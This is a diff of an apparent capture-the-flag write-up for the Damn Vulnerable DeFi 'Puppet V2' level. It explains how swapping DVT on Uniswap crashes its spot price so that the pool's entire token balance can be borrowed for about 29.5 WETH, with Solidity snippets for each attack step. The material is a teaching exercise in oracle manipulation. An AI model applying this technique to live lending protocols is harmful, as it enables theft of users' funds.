@@ -130,7 +130,7 @@ uint256 requriedWETH = UniswapV2Library.quote(amount.mul(10 ** 18), reservesToke
 
 Similar to the previous "Puppet" level, the vulnerability in this challenge **stems from an individual's capacity to significantly alter the price of an asset**. In this case, **the attacker, armed with a substantial number of DVT tokens, can manipulate the price of DVT by executing swaps on the Uniswap exchange, specifically in the DVT/WETH trading pair**. To **devalue the price**, the attacker must augment the DVT amount while decreasing the WETH quantity within the liquidity pool.
 
-If we employ the attacker's 10,000 DVT tokens and exchange them for WETH through the Uniswap pair contract, it will result in an increase in the DVT token quantity (from 100 to 10,100) and a decrease in the amount of WETH (from 10 to 0.0993...). This alteration will impact the ratio between them and substantially modify the cost of DVT, as follows:
+If we employ the attacker's 10,000 DVT tokens and exchange them for WETH through the Uniswap pair contract, **it will result in an increase in the DVT token quantity (from 100 to 10,100) and a decrease in the amount of WETH (from 10 to 0.0993...)**. This alteration will impact the ratio between them and substantially modify the cost of DVT, as follows:
 
 
 ```solidity
@@ -138,9 +138,7 @@ uint256 newCost = 1000000 * (0,0993.. / 10100e18) = 9.8321..
 uint256 newRequiredWETH = newCost * 3 = 29,4964.. WETH
 ```
 
-
-
-
+Let's move on the attack contract:
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -222,7 +220,7 @@ uint256 tokenAmount = token.balanceOf(address(this));
 token.approve(address(uniswap), tokenAmount);
 ```
 
-Then, we will **swap all DVT tokens with WETH** using the `UniswapRouter` contract.
+Then, we will **swap all DVT tokens with WETH** using the `UniswapRouter` contract. After the swap we should get **~9,9 WETH**.
 
 ```solidity
 address[] memory arr = new address[](2);
@@ -231,23 +229,19 @@ path[1] = arr(weth);
 uniswap.swapExactTokensForETH(tokenAmount,1,arr,address(this),uint256(block.timestamp *2));
 ```
 
-After that, our attack contract will get the extra WETH needed by interacting with `WETH9` contract.
+After that, get the extra WETH needed to borrow by depositing some ETH to the `WETH9` contract (**29,49 – 9,9 = ~19.6 WETH**).
 
 ```solidity
 weth.deposit{value: address(this).balance}();
 ```
 
+Finally, **borrow all the tokens with ~29.5 WETH instead of the original 300,000 WETH**.
+
 ```solidity
 uint256 ethAmount = weth.balanceOf(address(this));
 weth.approve(address(pool), ethAmount);
-```
-
-```solidity
 uint256 poolTokenAmount = token.balanceOf(address(pool));
 pool.borrow(poolTokenAmount);
-```
-
-```solidity
 uint256 borrowTokenAmount = token.balanceOf(address(this));
 token.transfer(msg.sender, borrowTokenAmount);
 ```
